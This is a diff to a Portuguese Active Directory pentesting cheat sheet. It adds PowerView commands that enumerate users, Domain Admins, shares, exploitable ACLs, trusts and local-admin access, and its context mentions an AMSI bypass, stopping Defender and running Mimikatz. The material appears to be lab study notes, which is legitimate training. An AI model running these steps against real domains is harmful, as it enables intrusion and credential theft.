@@ -22,7 +22,7 @@ Nota-se que todos os comandos aqui são dados a partir de máquinas windows para
         - [Jenkins](#jenkins)
         - [BloodHound](#bloodhound.ps1)
         - [HeidiSQL](#heidisql-download)
-        - [PowerUpSQL](#powerupsql.ps1)
+        - [PowerUpSQL.ps1](#powerupsql.ps1)
     - [Miscellaneous](#miscellaneous)
         - [Defense Bypass](#defense-bypass)
             - [AMSI Bypass](#amsi-bypass)
@@ -185,7 +185,9 @@ sc stop WinDefend
 
 #### Costrained Language Mode
 
-`Colocar o Invoke-Mimikatz no final do código, não somente o Invoke-Mimikatz mas qualquer outro comando ou script, que ele vai executar assim que carregar`
+```
+Colocar o Invoke-Mimikatz no final do código, não somente o Invoke-Mimikatz mas qualquer outro comando ou script, que ele vai executar assim que carregar
+```
 
 Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!
 
@@ -288,7 +290,7 @@ foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "
 ```powershell
 foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
 ```
-
+funcorp
 ### Download de Arquivos
 
 Escolha um e seja feliz!
@@ -337,29 +339,97 @@ Aqui vamos iniciar o reconhecimento do Active Directory que vamos explorar!
 
 ### PowerView
 
+Primeiro irei realizar os comandos para enumeração com o PowerView depois com o AD Module
+
 #### Usuários
+
+```powershell
+Get-NetUser
+Get-NetUser -UserName usuario_burro
+```
 
 #### Grupos
 
+```powershell
+Get-NetGroup | select Name
+```
+
 #### Computadores
+
+```powershell
+Get-NetComputer | select Name
+```
 
 #### Domain Administrators
 
+```powershell
+Get-NetGroupMember "Domain Admins"
+Get-NetGroup "Enterprise Admins" -Domain domain.com
+```
+
 #### Shares
+
+```powershell
+Invoke-ShareFinder
+```
 
 #### ACL
 
+```powershell
+Get-ObjectAcl -SamAccountName "Domain Admins" -Verbose
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "USUARIO"}
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RPDUsers"}
+Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
+Invoke-ACLScanner | Where-Object {$_.IdentityReferenceName –eq 'USUARIO$'}
+Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
+Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
+```
+
 #### OUs
+
+```powershell
+Get-NetOU | select name
+```
 
 #### GPO
 
+```powershell
+(Get-NetOU StudentMachines).gplink
+Get-NetGPO -ADSpath 'LDAP://cn={B822494A-DD6A-4E96-A2BB-944E397208A1},cn=policies,cn=system,DC=us,DC=funcorp,DC=local'
+```
+
 #### Trusts
+
+Isso é muito utilizado para Golden Ticket Across Forests!
+
+```powershell
+Get-NetForestDomain -Verbose
+Get-NetDomainTrust
+Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
+Get-NetForestDomain -Forest funcorp.local -Verbose | Get-NetDomainTrust
+Get-NetForest
+```
 
 #### User Hunting
 
+```powershell
+Find-LocalAdminAccess -Verbose
+Invoke-UserHunter -Verbose
+```
+
 #### SID
 
+```powershell
+us.dominio.local - Get-DomainSID
+dominio.local - Get-DomainSID -Domain dominio.local
+```
+
 ### PowerView_dev
+
+```powershell
+
+```
 
 ### AD Module
 
